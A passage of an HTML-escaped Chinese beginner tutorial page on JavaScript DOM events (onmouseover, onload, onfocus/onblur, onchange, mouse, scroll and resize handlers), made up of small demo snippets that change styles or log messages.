&lt;&#x2F;span&gt;&lt;span&gt;        var a=document.getElementsByClassName(&amp;#39;btn&amp;#39;);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        a[0].onmouseover=mouseover;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        function mouseover(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            alert(&amp;#39;hello&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        function mouseout(btn,bgcolor){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            btn.style.background=bgcolor;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;事件案例&lt;&#x2F;p&gt;
&lt;p&gt;onload&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;!-- &amp;lt;div id=&amp;quot;haha&amp;quot;&amp;gt;这是一个测试&amp;lt;&#x2F;div&amp;gt; --&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;img src=&amp;quot;time.jpeg&amp;quot; width=&amp;quot;200px&amp;quot; height=&amp;quot;100px&amp;quot; id=&amp;quot;img&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var a=document.getElementById(&amp;#39;img&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        a.onload=function(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            this.style.opacity=0.1&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; window.onload=function(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F;     var a=document.getElementById(&amp;#39;haha&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F;     var clicked=function(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F;         alert(&amp;#39;hello&amp;#39;);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F;     }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F;     a.onclick=clicked;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;onfocus     onblur    事件&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;div class=&amp;quot;haha&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;div class=&amp;quot;shuru&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;lt;input type=&amp;quot;text&amp;quot; placeholder=&amp;quot;请输入手机号码&amp;quot; id=&amp;quot;dianhua&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;&#x2F;div&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;div calss=&amp;quot;tishi&amp;quot;&amp;gt;请输入正确的手机号码&amp;lt;&#x2F;div&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;div&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var a=document.getElementById(&amp;#39;dianhua&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        a.onfocus=function(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            this.style.background=&amp;#39;green&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        a.onblur=function(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            this.style.background=&amp;#39;red&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;head&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;title&amp;gt;onfocus_onblur&amp;lt;&#x2F;title&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;style&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            .box&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            {&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                padding:50px;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            .left,.tip&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            {&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                float:left;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            .left{margin-right:10px;}&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            .tip{display:none;font-size:14px;}&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;&#x2F;style&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            window.onload=function(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                &#x2F;&#x2F;第一步，获取文本框和提示框&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                var phone=document.getElementById(&amp;quot;phone&amp;quot;),&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    tip=document.getElementById(&amp;quot;tip&amp;quot;);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                &#x2F;&#x2F;第二步，给文本框绑定激活的事件&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                phone.onfocus=function(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    &#x2F;&#x2F;让tip显示出来&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    tip.style.display=&amp;#39;block&amp;#39;;}&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                &#x2F;&#x2F;第三步，给文本框绑定失去焦点的事件&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                phone.onblur=function(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    &#x2F;&#x2F;获取文本框的值,value用于获取表单元素的值&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    var phoneVal=this.value;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    &#x2F;&#x2F;判断手机号码是否是11位的数字&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    &#x2F;&#x2F;如果输入正确，则显示对号图标，否则显示错号图标&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    if(phoneVal.length==11&amp;amp;&amp;amp;isNaN(phoneVal)==false)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    {&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                        this.style.color=&amp;#39;green&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    else{&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                        this.style.color=&amp;#39;red&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;head&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;div class=&amp;quot;box&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;lt;div class=&amp;quot;left&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;lt;input type=&amp;quot;text&amp;quot; id=&amp;quot;phone&amp;quot; placeholder=&amp;quot;请输入手机号码&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;lt;&#x2F;div&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;lt;div class=&amp;quot;tip&amp;quot; id=&amp;quot;tip&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            请输入有效的手机号码&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;lt;&#x2F;div&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;&#x2F;div&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;html&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;onchange事件&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;div class=&amp;quot;box&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        选择喜欢的背景色：&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;select id=&amp;quot;menu&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;lt;option value=&amp;quot;&amp;quot; hidden disabled selected&amp;gt;请选择&amp;lt;&#x2F;option&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;lt;option value=&amp;quot;red&amp;quot;&amp;gt;红色&amp;lt;&#x2F;option&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;lt;option value=&amp;quot;green&amp;quot;&amp;gt;绿色&amp;lt;&#x2F;option&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;lt;option value=&amp;quot;blue&amp;quot;&amp;gt;蓝色&amp;lt;&#x2F;option&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;lt;option value=&amp;quot;yellow&amp;quot;&amp;gt;黄色&amp;lt;&#x2F;option&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;lt;option value=&amp;quot;gray&amp;quot;&amp;gt;灰色&amp;lt;&#x2F;option&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;&#x2F;select &amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;div&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var menu=document.getElementById(&amp;#39;menu&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        menu.onchange=function(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            var bgcolor=menu.options[menu.selectedIndex].value;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            document.body.style.background=bgcolor&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;onmousedown    nomouseup    onscroll    事件；&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;head&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;title&amp;gt;Document&amp;lt;&#x2F;title&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;style&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        .box{&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        width:200px;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        height: 200px;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        background-color: gray;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        overflow: auto;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;style&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;head&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;div class=&amp;quot;box&amp;quot; id=&amp;quot;box&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;p&amp;gt;这是测试段落&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;p&amp;gt;这是测试段落&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;p&amp;gt;这是测试段落&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;p&amp;gt;这是测试段落&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;p&amp;gt;这是测试段落&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;p&amp;gt;这是测试段落&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;p&amp;gt;这是测试段落&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;p&amp;gt;这是测试段落&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;p&amp;gt;这是测试段落&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;div class=&amp;quot;box&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;p&amp;gt;test&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;p&amp;gt;test&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;p&amp;gt;test&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;p&amp;gt;test&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;p&amp;gt;test&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;p&amp;gt;test&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;p&amp;gt;test&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;p&amp;gt;test&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;p&amp;gt;test&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;p&amp;gt;test&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;p&amp;gt;test&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;p&amp;gt;test&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;p&amp;gt;test&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;p&amp;gt;test&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;p&amp;gt;test&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;p&amp;gt;test&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;p&amp;gt;test&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;p&amp;gt;test&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;p&amp;gt;test&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;p&amp;gt;test&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;p&amp;gt;test&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var box=document.getElementById(&amp;#39;box&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        box.onmousedown=function(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            console.log(&amp;#39;我被按下了&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        box.onmouseup=function(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            console.log(&amp;#39;我被松开了&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        window.onresize=function(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            console.log(&amp;#39;我的尺寸被改变了&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        box.onscroll=function(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            console.log(&amp;#39;我被滚动了&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        box.onclick=function(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            console.log(&amp;#39;我被点击了&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        box.onmousemove=function(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            console.log(&amp;#39;我被abc了&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        window.onscroll=function(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            console.log(&amp;#39;我是窗口滚动条&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;html&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;onkeyup onkeydown 事件&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;head&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;title&amp;gt;onkeyup&amp;lt;&#x2F;title&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;style&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
